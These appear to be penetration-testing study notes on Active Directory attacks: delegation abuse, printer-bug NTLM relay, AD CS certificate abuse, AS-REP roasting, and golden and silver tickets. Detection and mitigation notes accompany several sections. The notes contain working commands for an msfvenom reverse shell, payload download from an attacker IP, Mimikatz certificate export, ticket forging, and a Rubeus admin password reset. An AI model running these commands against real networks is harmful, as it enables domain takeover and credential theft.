**CONSTRAINED KD** - More Secure, this restricts what services an account can be delegated to.

Exploiting Constrained KD is complex compared to other delegation models.

Limiting exposure if an account is compromised.

---

### Steps to Exploit Constrained KD:

1. Identify the Server with Constrained Delegation
2. Identify services on the host running
3. CHECK THE Access Attribute of the Compromised host
4. Use mimikatz to dump the LSA Secrets (credential storage)
5. Use Kekeo to force a Kerberos Connection between Compromised Host & service; we generate TGT then use it to forge TGS requests for the account we want to impersonate
6. Create a new PowerShell Session for the Compromised Host
7. Enter the Session

---

### RESOURCE-BASED CONSTRAINED Delegation (RBCD)

**Kerberos Delegation Comparison:**


*Figure: Comparison of three Kerberos delegation mechanisms with exploitation paths and detection indicators*

---

### RESOURCE-BASED CONSTRAINED Delegation (RBCD)

Different from other delegation models as the attribute controls & stores a security Descriptor (specifying which object can delegate to which service); with the object that can access Resource, allowing the Service Owner to Control who has access to the Resource.

**RBCD: MSDS-AllowedToActOnBehalfOfOtherIdentity**

This means that Instead of specifying that the Web Service Account can delegate to the Database Server to access the database, we can now Specify that on the database Service that the Service Account is allowed to delegate.

---

### STEPS to Leverage RBCD:

1. CHECK THE Access Attribute of the Compromised host
2. Create a new Computer Account
3. Allow new Computer Account to act on behalf of the other compromised computer host in the domain
4. Leverage RUBEUS To ABUSE RBCD

---

## PRINTER BUG (Microsoft RPC)


**Exploiting Automated Relays:** Another excellent attack that can be performed to gain privileged access to a host but Unstable.

All Windows hosts have a "Machine Account" - Essentially this is the User account associated with the machine joining the domain.

Domain Controllers use their Machine Accounts to synchronize Active Directory Updates before onward set of Application account Credentials.

When you request a Certificate on behalf of the host you are working on, the machine Account of that host is used for Authentication to the AD Certificate Services.

---

### Requirements

A Valid AD Network Connectivity along with SMB Service:
- Target Host must be Running Print Spooler service
- Target host mustn't have SMB Signing Enforced

We need to meet these conditions to exploit this; we need a set of Application account Credentials.

---

### Microsoft-RPRN Protocol

**PRINTER BUG** - Functions of the Microsoft-RPRN protocol (MS-RPRN Remote Protocol), which allows a domain user to remotely force a Computer Host to authenticate the PRINT Spooler service to an arbitrary IP address.

To exploit this, we need to meet conditions:
- Network Connectivity to target along with SMB Service
- Target Host must be Running Print Spooler service
- Target host mustn't have SMB Signing Enforced

---

### BloodHound Custom Query

We identify cases like these Using "Custom Query":

```
MATCH p = (c1:Computer)-[r1:MemberOf*1..]->(g:Group)
-[r2:AdminTo]->(n:Computer)
RETURN p
```

**Security Objective:** CHECK Different SMB signing: Enforced vs Allowed.

This Query will attempt to find Instances where a Computer has "Admin to" Relationship over another Machine.

---

### SMB Signing Check

In order to relay the Coerced Authentication Attempt, SMB Signing shouldn't be enforced to force the target not to sign the SMB authentication attempt.

We can use `nmap` to check:

```bash
nmap --script=smb-security-mode <target>
```

**Results:** Message Signing Enabled but not Required

Once Conditions are met, we can Attack.

---

### Attack Steps on Already Compromised Active Directory host

We Will be using **Spool Sample** to Exploit Authentication Relays:

1. Setup NTLM Relay on your Attack Box using IP (hostname) + SpoolSample.exe
   
   ```bash
   python ntlmrelayx.py -smb2support -t smb://<Target IP> -c <command> --debug
   ```

2. With the Relay listening, We can Coerce the Main Target Host to authenticate to us (this will be carried out inside an already compromised host in the active directory network) Using SpoolSample.exe (a C# exploit Compiled for this purpose)

   ```
   SpoolSample.exe <Target Name> <Attacker IP>
   ```

3. Use WinRM from Attack box along with Admin User Hash from Captured Relay; execute on Image as User

   ```bash
   evil-winrm -i <Target IP> -u <User> -H <Hash>
   ```

Remember to use IP.

**NTLM Relay Attack Sequence:**

```mermaid
sequenceDiagram
    participant Victim as Victim User/Computer
    participant Attacker as Attacker<br/>(ntlmrelayx/Responder)
    participant Target as Target Server<br/>(High-Value Target)
    participant DC as Domain Controller
    
    Note over Victim,Target: Phase 1: Setup & Poisoning
    Attacker->>Attacker: Start Responder:<br/>-I eth0 -dPv<br/>Poison LLMNR/NBT-NS/WPAD
    Attacker->>Attacker: Start ntlmrelayx.py:<br/>-tf targets.txt -smb2support
    
    Note over Victim: Phase 2: Victim Connection Attempt
    Victim->>Victim: User types incorrect share:<br/>\\fileserverr\share<br/>(typo in name)
    Victim->>Victim: DNS lookup fails
    Victim->>Victim: Fall back to LLMNR/NBT-NS<br/>broadcast query
    
    Note over Attacker: Phase 3: Poisoning Response
    Victim->>Attacker: LLMNR/NBT-NS query:<br/>"Who is fileserverr?"
    Attacker-->>Victim: Poisoned response:<br/>"I am fileserverr at 192.168.1.50"
    
    Note over Victim,Target: Phase 4: NTLM Authentication (Relayed)
    Victim->>Attacker: SMB connection attempt<br/>NTLM Type 1: NEGOTIATE
    
    rect rgb(255, 230, 230)
        Note over Attacker: Attacker does NOT respond to victim,<br/>instead relays to target
    end
    
    Attacker->>Target: Relay NTLM Type 1 NEGOTIATE<br/>to high-value target
    Target-->>Attacker: NTLM Type 2: CHALLENGE<br/>(8-byte random challenge)
    
    Attacker-->>Victim: Forward Type 2 CHALLENGE<br/>to victim
    Victim->>Victim: Encrypt challenge with<br/>user's NTLM hash
    Victim->>Attacker: NTLM Type 3: RESPONSE<br/>(challenge encrypted with hash)
    
    Attacker->>Target: Relay Type 3 RESPONSE<br/>to target server
    
    Target->>DC: Validate NTLM response
    DC-->>Target: Authentication successful
    Target-->>Attacker: Access granted as victim user
    
    Note over Attacker,Target: Phase 5: Post-Exploitation
    
    rect rgb(230, 255, 230)
        Note over Attacker: Attacker now has authenticated session<br/>with victim's privileges on target
    end
    
    Attacker->>Target: Dump SAM database<br/>secretsdump.py
    Target-->>Attacker: Local account hashes
    
    Attacker->>Target: Execute commands<br/>via SMB/WMI/WinRM
    Target-->>Attacker: Command output
    
    Attacker->>Target: Create persistence:<br/>New admin user, scheduled task
    Target-->>Attacker: Persistence established
    
    rect rgb(255, 240, 240)
        Note over Victim,Target: Requirements for Success:<br/>• SMB signing disabled on target<br/>• Victim must have admin rights on target<br/>• Victim must attempt authentication<br/>• Cannot relay back to same machine
    end
    
    rect rgb(240, 240, 255)
        Note over Target: Detection:<br/>Event 4624 Logon Type 3<br/>Event 4648 (Explicit credentials)<br/>Unusual source IP for authentication<br/>SMB connections from non-standard hosts<br/>Multiple failed relay attempts
    end
    
    rect rgb(255, 255, 230)
        Note over Target: Mitigation:<br/>Enable SMB signing (Require)<br/>Disable LLMNR/NBT-NS<br/>Local Admin Password Solution (LAPS)<br/>Network segmentation
    end
```



*Figure: NTLM Relay attack exploiting disabled SMB signing to relay authentication from poisoned victim to high-value target*

---

## EXPLOITING AD USERS & USER BEHAVIOUR

**Keylogging** → How users Interact with a system + Screen Grabs

**WinRM**

- Find Credential database or password file (mdb/kdb/.cw) - Ability to crack May Come Into Question
- Meterpreter has built-in keylogger - Extracts user keystrokes
- Ensure our shell is Running in User Context
- Meterpreter Migrate Feature - if we have too much privilege, we can migrate to any user process

**msfvenom Syntax:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f psh -o shell.ps1
```

**Setup:**
```bash
sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <port>; exploit"
```

If created Webserver:
```bash
sudo python3 -m http.server 80
```

**Using certutil / Powershell Net.WebClient to download file to Target:**

```cmd
certutil -urlcache -split -f http://<AttackIP>/shell.ps1
```

```powershell
$WC = New-Object Net.WebClient
$WC.DownloadFile("http://<AttackIP>/file", "C:\destination\path")
```

**Tip:** Using Powershell to download:
```powershell
powershell.exe -ep bypass
```

---

### HOST METERPRETER

1. Look to see if user has Running processes
2. Migrate to the Currently running process: `migrate <processID>`
3. Confirm Running user context: `getuid` command
4. Start Keylogger: `keyscan_start`
5. Dump: `keyscan_dump` After Capture

---

## EXPLOITING GROUP POLICY OBJECTS

**Group Policy Replication** - always happens every 15 minutes to apply policies.

To apply policies Instantly/manually executed from CMD prompt:

```cmd
gpupdate /force
```

**Exploit Group Policy Objects:** `\\<Domain>\SYSVOL` Directory → the Directory where AD GPO are stored.

Each Windows Computer has a local policy Configuration:
- Local group membership (e.g. Admin / Remote users)
- Startup config
- Security / protocol settings

**Group Policy Object (GPO) Exploitation Flow:**


*Figure: Group Policy Object exploitation workflow from enumeration through deployment to persistence*

---

### Group Policy Management

**"Group Policy Management"** is a mechanism to deploy a Configuration from a Centralized location.

GPM allows us to define policies directly on the AD such that we can define GPO for AD objects directly.

Our ability to modify & Impersonate any Group/User/Host is limitless as we can add users to groups as well as Groups Into groups.

---

### Steps:

1. RDP to privileged Compromised Host
   
   ```cmd
   xfreerdp /v:<FQDN/IP> /u:<username> /p:"<password>"
   ```

2. Inject Service Account Credentials for any other compromised Account Credentials

   ```cmd
   runas /netonly /user:<DC Domain>\<user> cmd.exe
   mmc.exe
   ```

---

## EXPLOITING AD CERTIFICATES

**AD CS** - Microsoft Public Key Infrastructure (PKI) Implementation.

**Enterprise CA** → CA Integrated with AD (as opposed to standalone CA)

Read SpectreOps Whitepapers + **AZURE AD CS == AWS KMS**

**Exploiting AD CERTIFICATES:** AD CS is Microsoft Public Key Infrastructure platform Implementation.

Provides level of Trust:
- Encrypting file systems
- Creating & verifying digital Signatures
- Client Authentication

AD CS can be used as a Certificate Authority; A privileged function running on selected Domain Controllers.

Distribution & Management of these Certificates leads to a Herculean Task if done Manually, therefore Several Templates are created by Administrators that allow any user with relevant permissions to Request Certificates themselves.

Parameters of these Templates (collection of settings by policies) that define the Certificate - Can be abused/exploited if found in the right Combination leading to privilege Escalation & Persistent Access.

---

### AS-REP Roasting Attack Flow

**AS-REP Roasting** exploits users with "Do not require Kerberos preauthentication" enabled, allowing offline password cracking without any authentication.

```mermaid
sequenceDiagram
    participant Attacker
    participant DC as Domain Controller<br/>(KDC)
    participant Target as Target User Account<br/>(PreAuth Disabled)
    
    Note over Attacker: Phase 1: User Enumeration
    Attacker->>DC: LDAP Query:<br/>(&(objectCategory=person)<br/>(objectClass=user)<br/>(userAccountControl:1.2.840.113556.1.4.803:=4194304))
    DC-->>Attacker: List of users with<br/>"Do not require Kerberos preauth" flag
    
    rect rgb(255, 240, 240)
        Note over Target: User Properties:<br/>userAccountControl contains<br/>DONT_REQ_PREAUTH flag (0x400000)<br/>Often set by admins for legacy apps<br/>or service accounts
    end
    
    Note over Attacker: Phase 2: AS-REQ Without Pre-Authentication
    Attacker->>DC: AS-REQ for target user<br/>Client: target_username<br/>NO pre-authentication data included
    
    rect rgb(240, 255, 240)
        Note over DC: Normal Kerberos Flow Requires:<br/>1. Client sends AS-REQ with timestamp<br/>2. Timestamp encrypted with user's key<br/>3. DC verifies before sending AS-REP<br/><br/>BUT if PreAuth disabled:<br/>DC skips verification step!
    end
    
    Note over Attacker,DC: Phase 3: DC Responds Without Verification
    DC->>DC: Generate AS-REP<br/>TGT encrypted with user's NTLM hash<br/>Session key encrypted with user's hash
    DC-->>Attacker: AS-REP containing:<br/>- TGT (encrypted with krbtgt)<br/>- Session key (encrypted with user hash)<br/>- User's encrypted timestamp
    
    rect rgb(240, 240, 255)
        Note over Attacker: Critical Vulnerability:<br/>The encrypted portion contains<br/>data encrypted with user's password hash<br/>Can be cracked OFFLINE with hashcat
    end
    
    Note over Attacker: Phase 4: Extract & Format Hash
    Attacker->>Attacker: Extract AS-REP from response<br/>Tools:<br/>- GetNPUsers.py (Impacket)<br/>- Rubeus asreproast<br/>- PowerView Get-DomainUser -PreauthNotRequired
    
    Attacker->>Attacker: Format for Hashcat:<br/>$krb5asrep$23$username@DOMAIN:hash...
    
    Note over Attacker: Phase 5: Offline Password Cracking
    Attacker->>Attacker: Hashcat Mode 18200:<br/>hashcat -m 18200 asrep.hash wordlist.txt
    
    Attacker->>Attacker: Or John the Ripper:<br/>john --wordlist=rockyou.txt asrep.hash
    
    Note over Attacker: Phase 6: Password Recovered
    Attacker->>Attacker: Plaintext password obtained:<br/>Password123!
    
    Note over Attacker: Phase 7: Post-Exploitation
    Attacker->>DC: Normal authentication<br/>with recovered password
    DC-->>Attacker: Access granted
    
    Attacker->>Attacker: Use credentials for:<br/>- Lateral movement<br/>- Privilege escalation<br/>- Persistent access
    
    rect rgb(255, 255, 230)
        Note over Attacker,Target: Attack Requirements:<br/>• Valid domain username (can be from enumeration)<br/>• Network access to DC (port 88 Kerberos)<br/>• User has PreAuth disabled<br/>• NO authentication needed to perform attack
    end
    
    rect rgb(255, 230, 230)
        Note over DC: Detection:<br/>Event 4768: TGT Request<br/>  - Pre-Auth Type: 0 (no pre-auth)<br/>  - Account Name: vulnerable_user<br/>Event 4625: Failed logons (if brute forcing usernames)<br/>Multiple AS-REQ from same source<br/>Unusual Kerberos traffic patterns
    end
    
    rect rgb(230, 255, 230)
        Note over Target: Mitigation:<br/>• Do NOT disable Kerberos pre-auth<br/>• Audit userAccountControl for flag 0x400000<br/>• Strong passwords (25+ chars) for required cases<br/>• Monitor Event ID 4768 for PreAuth Type 0<br/>• Use service accounts with random passwords
    end
    
    rect rgb(240, 240, 255)
        Note over Attacker: Tools:<br/>Impacket: GetNPUsers.py -dc-ip 10.10.10.10 domain.com/ -usersfile users.txt<br/>Rubeus: Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt<br/>Hashcat: hashcat -m 18200 -a 0 hashes.txt wordlist.txt
    end
```



*Figure: AS-REP Roasting attack exploiting disabled Kerberos pre-authentication for offline password cracking*

---

### Key Terms

- **SAN** - Subject Alternative Name
- **UPN** - User Principal Name
- **CSR** - Certificate Signing Request
- **EKU** - Extended/Enhanced Key Usage that define key content + Object identifiers

**AD Certificate Services (AD CS) Exploitation Flow:**

```mermaid
graph TB
    Start[Compromised Domain User Account]
    Start --> Enum[Enumerate AD CS Infrastructure]
    
    Enum --> E1[Find Certificate Authorities:<br/>certutil -config - -ping]
    Enum --> E2[Enumerate certificate templates:<br/>Certify.exe find /vulnerable]
    Enum --> E3[Check permissions:<br/>Get-ADObject templates]
    
    E1 & E2 & E3 --> Vuln{Vulnerable Template Found?}
    
    Vuln -->|No| Alternative[Try other attacks:<br/>Kerberoasting, AS-REP roasting]
    Vuln -->|Yes| VulnType{Vulnerability Type}
    
    subgraph ESC1["ESC1: SAN Specification"]
        ESC1_Check[Template allows:<br/>• Client Authentication EKU<br/>• CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT<br/>• Low-priv enrollment rights<br/>• No manager approval]
        
        ESC1_Check --> ESC1_1["Request certificate with<br/>arbitrary SAN UPN"]
        ESC1_1 --> ESC1_2["Certify.exe request<br/>/ca:CA-Name /template:VulnTemplate<br/>/altname:Administrator@domain.com"]
        ESC1_2 --> ESC1_3[Certificate issued with<br/>Administrator UPN in SAN]
        ESC1_3 --> ESC1_4[Export certificate with private key<br/>.pfx file created]
    end
    
    subgraph ESC2["ESC2: Any Purpose EKU"]
        ESC2_Check[Template allows:<br/>• Any Purpose EKU or no EKU<br/>• Low-priv enrollment<br/>• Can be used for anything]
        
        ESC2_Check --> ESC2_1[Request subordinate CA cert]
        ESC2_1 --> ESC2_2[Use to sign arbitrary certs]
        ESC2_2 --> ESC2_3[Create admin certificate]
    end
    
    subgraph ESC3["ESC3: Enrollment Agent"]
        ESC3_Check[Template allows:<br/>• Certificate Request Agent EKU<br/>• Enroll on behalf of others]
        
        ESC3_Check --> ESC3_1[Request enrollment agent cert]
        ESC3_1 --> ESC3_2[Use to request cert<br/>on behalf of admin]
        ESC3_2 --> ESC3_3[Obtain admin certificate]
    end
    
    subgraph ESC4["ESC4: Template ACL"]
        ESC4_Check[Attacker has:<br/>• WriteProperty on template<br/>• WriteDacl/WriteOwner<br/>• Can modify template]
        
        ESC4_Check --> ESC4_1[Modify template properties:<br/>Enable SAN specification<br/>Add enrollment rights]
        ESC4_1 --> ESC4_2[Request certificate<br/>with modified template]
        ESC4_2 --> ESC4_3[Restore template<br/>or leave backdoor]
    end
    
    subgraph ESC6["ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2"]
        ESC6_Check[CA has flag:<br/>• EDITF_ATTRIBUTESUBJECTALTNAME2<br/>• Allows SAN in CSR<br/>• on ANY template]
        
        ESC6_Check --> ESC6_1[Request any template cert<br/>with SAN in CSR attributes]
        ESC6_1 --> ESC6_2[CA honors SAN from CSR<br/>ignoring template config]
        ESC6_2 --> ESC6_3[Certificate issued with<br/>arbitrary UPN]
    end
    
    subgraph ESC7["ESC7: CA ACL Abuse"]
        ESC7_Check[Attacker has:<br/>• ManageCA rights on CA<br/>• ManageCertificates rights<br/>• Can approve pending requests]
        
        ESC7_Check --> ESC7_1[Enable EDITF flag OR<br/>approve pending cert request]
        ESC7_1 --> ESC7_2[Issue arbitrary certificates]
    end
    
    subgraph ESC8["ESC8: NTLM Relay to HTTP Enrollment"]
        ESC8_Check[CA has:<br/>• Web enrollment enabled<br/>• HTTP (not HTTPS)<br/>• No EPA/SMB signing]
        
        ESC8_Check --> ESC8_1[NTLM relay victim to<br/>http://ca/certsrv]
        ESC8_1 --> ESC8_2[Request certificate<br/>as relayed victim]
        ESC8_2 --> ESC8_3[Obtain victim's certificate]
    end
    
    VulnType -->|ESC1| ESC1_Check
    VulnType -->|ESC2| ESC2_Check
    VulnType -->|ESC3| ESC3_Check
    VulnType -->|ESC4| ESC4_Check
    VulnType -->|ESC6| ESC6_Check
    VulnType -->|ESC7| ESC7_Check
    VulnType -->|ESC8| ESC8_Check
    
    ESC1_4 --> TGT[Request TGT with Certificate]
    ESC2_3 --> TGT
    ESC3_3 --> TGT
    ESC4_3 --> TGT
    ESC6_3 --> TGT
    ESC7_2 --> TGT
    ESC8_3 --> TGT
    
    TGT --> Rubeus[Rubeus.exe asktgt<br/>/user:Administrator<br/>/certificate:cert.pfx<br/>/password:certpass<br/>/domain:domain.com<br/>/dc:dc-ip]
    
    Rubeus --> TGT_Obtained[TGT for Administrator obtained]
    
    TGT_Obtained --> PostExploit{Post-Exploitation}
    
    PostExploit -->|Option 1| PE1[Use TGT directly:<br/>Pass-the-Ticket attacks<br/>Access resources as admin]
    PostExploit -->|Option 2| PE2[Change admin password:<br/>Rubeus.exe changepw<br/>/ticket:tgt.kirbi<br/>/new:NewPass123!]
    PostExploit -->|Option 3| PE3[DCSync attack:<br/>Extract all domain hashes]
    
    PE1 & PE2 & PE3 --> Persist[Establish Persistence]
    
    subgraph Persistence["Certificate-Based Persistence"]
        P1[Steal CA private key:<br/>Mimikatz crypto::certificates<br/>Export CA certificate + key]
        P1 --> P2[Forge certificates indefinitely<br/>Valid until CA cert expires]
        P2 --> P3[Create golden certificates<br/>Credential-agnostic persistence]
        P3 --> P4[Survives password changes<br/>Account disablement<br/>Standard remediation]
    end
    
    DetNote[DETECTION: Event 4886-4887 Certificate request<br/>Event 4890 CA settings changed - Unusual enrollments<br/>certutil.exe or Certify.exe execution - Non-standard hosts/times]
    
    MitNote[MITIGATION: Disable vulnerable templates - Remove enrollment permissions<br/>Require manager approval - Monitor certificate issuance<br/>Remove EDITF flag from CA - Enable EPA on web enrollment]
    
    style ESC1_4 fill:#ff9999
    style ESC8_3 fill:#ff9999
    style P4 fill:#ff6666
    style Detection fill:#ffcccc
```

*Figure: AD Certificate Services exploitation techniques (ESC1-ESC8) from enumeration through persistence*

---

### Contents of a Certificate issued by an Enterprise CA

A Certificate Template is deemed Misconfigured if a Combination of parameter values become poisonous, allowing:

1. **Client Authentication:** Defined by its EKU
   - The Certificate Can be used for client Authentication

2. **Certificate Permissions are Overly Permissive:**
   - Enterprise CA grants low privilege users enrollment
   - Right to request and use certificate template

3. **Manager Approval is disabled**

4. **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set to 1**
   - Certificate Template allows Requester to specify the SAN

5. **Certificate Template allows requesters to Specify Subject AltName (SAN) in the Certificate Sign Request**
   - This template allows us to impersonate another high privileged user by specifying the UPN

6. **Certificate Will be exportable if the private key:**
   - `CT_PRIVATE_KEY_FLAG_EXPORTABLE_KEY` set

7. **No Authorized Signatures are Required**

---

### NB: After a forged Certificate has been Created & Exported

We can use **Rubeus.exe** to request a Golden Ticket (TGT).

**Rubeus Syntax for Forged Certificate → TGT:**

```cmd
Rubeus.exe asktgt /user:<admin> /enctype:<aes256> /certificate:<path to cert> /password:<cert file password> /outfile:<tgt.kirbi> /domain:<FQDN> /dc:<IP of Domain Controller>
```

**Parameters:**
- `/user:` - Specifies the user we will Impersonate - has to match the UPN for the Certificate we generated
- `/enctype:` - Encryption type for the Kerberos Ticket
- `/certificate:` - Directory path to the Certificate we generated
- `/password:` - The password used for the Certificate file
- `/outfile:` - The file where our TGT will be output to (use `.kirbi` file extension)
- `/domain:` - The FQDN of the domain we are attacking
- `/dc:` - The IP of domain Controller which we are requesting the TGT from. Select a DC that has a CA Service

---

### Using the Forged Certificate to Request a Kerberos TGT

We can use **Rubeus** to Load the Kerberos TGT into any hacking platform of choice:

**Option 1:** Export the TGT to our Attack box & Use Metasploit, Cobalt Strike, Covenant to gain access elevated.

**Option 2:** Use Rubeus to use the TGT ticket to alter the password of any of the Domain Administrators.

```cmd
Rubeus.exe changepw /ticket:<file> /new:<new password> /dc:<Target DC IP> /targetuser:<Administrator>
```

Option 2 allows us to use the DA's Credential to log Into the Domain Controller as Administrator.

We can now authenticate as the Administrator to the DC, also We can use RUNAS command to authenticate as another DA.

---

### Persistence through Certificates

**Credential AGNOSTIC** - Rotation of credentials will not kick us out.

We need a valid Certificate that can be used for Client Authentication; allows us to Request a TGT; allows for Continuous TGT requests.

Let's go after the Certificate Authority: The private key of the CA is stored on the CA Server itself.

**CA Private key** often protected by:
- Hardware Security Module (HSM)
- Machine Data Protection API (DPAPI)

Use Tools like **Mimikatz** & **SharpDPAPI** to extract the CA Certificate & thus the private key from the CA.

---

### Mimikatz Syntax to view Certificates:

```
mimikatz # privilege::debug
mimikatz # crypto::certificates /systemstore:local_machine
```

**Syntax allows us to patch memory to make Certificate Keys exportable:**

```
mimikatz # crypto::capi
mimikatz # crypto::cng
```

**Export Certificates:**

```
mimikatz # crypto::certificates /systemstore:local_machine /export
```

**Note:** `/export` option

The exported Certificates will be stored in `.pfx` & `.DER` format to Disk.

In order to export the private key, a password must be used to encrypt the Certificate; by default, mimikatz assigns the password: **mimikatz**

Download/Copy the Certificate (Password was mimikatz) to your Attack Box Using SCP.

---

## KERBEROS TICKET FORGERY ATTACKS

**Date: 26/02/25**

### NOTES

**Kerberos Ticket Forgery** enables attackers to bypass normal authentication by crafting forged tickets that grant unauthorized access to domain resources.

**Attack Types:**
- **FORGED TGTs (Golden Tickets)** - Bypass Kerberos authentication steps 1 & 2
- **FORGED TGSs (Silver Tickets)** - Bypass Kerberos authentication steps 1→4
- **FORGED Trust Tickets** - Enable cross-domain/forest attacks

**Ticket Forgery Comparison:**

```mermaid
graph TB
    subgraph Golden["Golden Ticket (TGT Forgery)"]
        G1[Requirements:<br/>• krbtgt hash<br/>• Domain SID<br/>• Domain name]
        G2[Scope:<br/>• Entire domain<br/>• All services<br/>• 10-year lifetime]
        G3[Detection:<br/>• Ticket anomalies<br/>• Event ID 4768<br/>• Unusual TGT requests]
        G4[Bypass:<br/>Steps 1-2 of Kerberos]
    end
    
    subgraph Silver["Silver Ticket (TGS Forgery)"]
        S1[Requirements:<br/>• Service account hash<br/>• Target hostname<br/>• SPN]
        S2[Scope:<br/>• Single service<br/>• Single host<br/>• 30-day max]
        S3[Detection:<br/>• No DC contact<br/>• No Event ID 4769<br/>• Harder to detect]
        S4[Bypass:<br/>Steps 1-4 of Kerberos]
    end
    
    subgraph Trust["Trust Ticket (Inter-Domain)"]
        T1[Requirements:<br/>• Trust key hash<br/>• Source/Target SIDs<br/>• Trust type]
        T2[Scope:<br/>• Cross-domain<br/>• Forest boundaries<br/>• SID filtering bypass]
        T3[Detection:<br/>• Trust auth anomalies<br/>• SID history injection<br/>• Event ID 4768/4769]
        T4[Bypass:<br/>Trust boundaries]
    end
    
    style Golden fill:#ffcccc
    style Silver fill:#ccffcc
    style Trust fill:#ccccff
```



*Figure: Comparison of ticket forgery attack types showing requirements, scope, and detection characteristics*

---

### Kerberos Authentication Flow (Normal)

1. **AS-REQ**: User requests TGT from Key Distribution Center (KDC)
2. **AS-REP**: KDC returns TGT encrypted with krbtgt hash
3. **TGS-REQ**: User presents TGT to request service ticket (TGS)
4. **TGS-REP**: KDC returns TGS encrypted with service account hash
5. **AP-REQ**: User presents TGS to access service
6. **AP-REP**: Service grants access

**Ticket Forgery Impact:** By forging tickets at different stages, attackers skip authentication requirements and gain unauthorized access.

---

### Golden Ticket Attacks

**What is a Golden Ticket?**

A Golden Ticket is a forged Ticket Granting Ticket (TGT) created using the krbtgt account's NTLM hash. This allows complete domain impersonation since the TGT is encrypted and signed with the same key the Domain Controller uses.

**Requirements:**
- `krbtgt` account password hash (NTLM or AES)
- Domain Controller's fully qualified domain name (FQDN)
- Domain Security Identifier (SID)
- User RID for the account to impersonate (default: 500 for Administrator)

**Attack Capabilities:**
- Complete domain access for up to 10 years (configurable ticket lifetime)
- Bypass smart card authentication (verified before TGT creation)
- Generate tickets from non-domain-joined machines
- Overwrite Kerberos policies and ticket validation rules
- No communication with Domain Controller required after creation

**Attack Procedure:**

1. **Obtain krbtgt hash** via DCSync, NTDS.dit extraction, or LSASS dumping
2. **Enumerate domain information:**
   ```cmd
   whoami /user  # Get user SID
   echo %userdomain%  # Get domain name
   ```
3. **Forge Golden Ticket** using Mimikatz (see command syntax below)
4. **Inject ticket** into current session or save for later use
5. **Access domain resources** with forged credentials

**Detection Indicators:**
- Ticket lifetime exceeds domain policy (e.g., 10-year tickets)
- TGT requests from unusual locations/IP addresses
- krbtgt account usage anomalies
- Event ID 4768 (TGT requests) with suspicious attributes

**Mimikatz Command Syntax:**
```cmd
mimikatz # kerberos::golden /admin:<Username> /domain:<FQDN> /id:<RID> /sid:<Domain-SID> /krbtgt:<NTLM-Hash> /endin:<minutes> /renewmax:<minutes> /ptt
```

**Key Parameters:**
- `/admin:` Username to impersonate (doesn't need to exist)
- `/domain:` Target domain FQDN
- `/id:` User RID (500 = Administrator, 501 = Guest)
- `/sid:` Domain SID (e.g., S-1-5-21-1234567890-...)
- `/krbtgt:` NTLM hash of krbtgt account
- `/endin:` Ticket lifetime in minutes (default: 10 years)
- `/renewmax:` Maximum ticket renewal time
- `/ptt` Pass-the-ticket flag (inject directly into session)

**(See Appendix A for complete KERBEROS::Golden parameter documentation including AES encryption, group membership customization, and trust ticket options)**

**Defense Strategies:**

1. **Password Rotation:** Reset krbtgt password **twice** (current + previous hash are both valid)
2. **Monitoring:** Track Event ID 4768, 4769 for anomalous TGT/TGS requests
3. **Baseline Validation:** Alert on tickets with lifetimes exceeding policy
4. **Privileged Account Management:** Limit accounts with DCSync rights
5. **Network Segmentation:** Restrict Domain Controller access

**Important:** Golden tickets remain valid until krbtgt password is rotated twice, even if the impersonated user's password changes or account is disabled.

---

### Silver Ticket Attacks

**What is a Silver Ticket?**

A Silver Ticket is a forged Ticket Granting Service (TGS) ticket created using a service account's NTLM hash. Unlike Golden Tickets, Silver Tickets grant access only to specific services on specific hosts.

**Requirements:**
- NTLM hash of target service account (machine account or service principal)
- Target hostname (FQDN)
- Service Principal Name (SPN) - e.g., CIFS, HTTP, MSSQL, HOST
- Domain SID
- User RID to impersonate

**Attack Scope:**
- Limited to the specific service on the target host
- No Domain Controller communication (stealthier than Golden Tickets)
- Cannot request additional service tickets
- Permissions determined by forged SID values

**Attack Capabilities:**
- Access file shares (CIFS), web applications (HTTP), databases (MSSQL)
- Create non-existent users with arbitrary group memberships
- Bypass authentication for specific services
- Evade detection (no DC logs generated)

**Attack Procedure:**

1. **Identify target service:**
   ```powershell
   setspn -T <domain> -Q */*  # Enumerate all SPNs
   ```
2. **Obtain service account hash** via Kerberoasting, LSASS dumping, or secretsdump
3. **Forge Silver Ticket** with desired service type
4. **Inject ticket and access service**

**Common Service Types:**
- **CIFS** - File sharing (access C$ administrative shares)
- **HTTP** - Web applications and services
- **HOST** - Remote scheduled tasks, WMI
- **MSSQL** - Database access
- **LDAP** - Directory queries
- **WSMAN** - Windows Remote Management

**Mimikatz Command Syntax:**
```cmd
mimikatz # kerberos::golden /admin:<Username> /domain:<FQDN> /id:<RID> /sid:<Domain-SID> /target:<Target-FQDN> /rc4:<Service-Hash> /service:<SPN> /ptt
```

**Key Parameters:**
- `/admin:` Username to impersonate (can be fictional)
- `/domain:` FQDN of the domain
- `/id:` User RID (default: 500)
- `/sid:` Domain SID
- `/target:` Target server's fully qualified hostname
- `/rc4:` NTLM hash of service account
- `/service:` Service type (cifs, http, ldap, mssql, etc.)
- `/ptt` Inject ticket into current session

**(See Appendix A for complete parameter documentation including multi-service tickets and AES encryption options)**

**Detection Indicators:**
- Service access without corresponding TGT requests
- Tickets requested for non-existent user accounts
- Unusual SPN usage patterns
- Service account authentication anomalies

**Defense Strategies:**

1. **Password Rotation:** Service/machine account passwords auto-rotate every 30 days
2. **Monitoring:** Track service authentication (Event ID 4769) for anomalies
3. **Registry Hardening:** Prevent modification of password rotation parameters
4. **Service Account Security:** Use managed service accounts (MSA/gMSA)
5. **Network Monitoring:** Detect service access without DC authentication

**Limitation:** Silver Tickets expire when service account password rotates (30 days for machine accounts), making them unsuitable for long-term persistence.

---

### Trust Ticket Attacks

**What is a Trust Ticket?**

Trust Tickets exploit inter-domain or inter-forest trust relationships by forging tickets that appear to originate from a trusted domain, enabling cross-boundary attacks.

**Requirements:**
- Trust key (NTLM hash of inter-domain trust account)
- Target domain SID
- Source domain SID  
- Trust relationship type (parent-child, forest, external)

**Attack Capabilities:**
- Escalate from child domain to parent domain (forest root)
- Move laterally across trusted domains
- Inject arbitrary SIDs (SID History attack)
- Bypass forest trust security boundaries

**(See Appendix A for complete Trust Ticket creation syntax, SID filtering bypass techniques, and cross-forest attack procedures)**

---

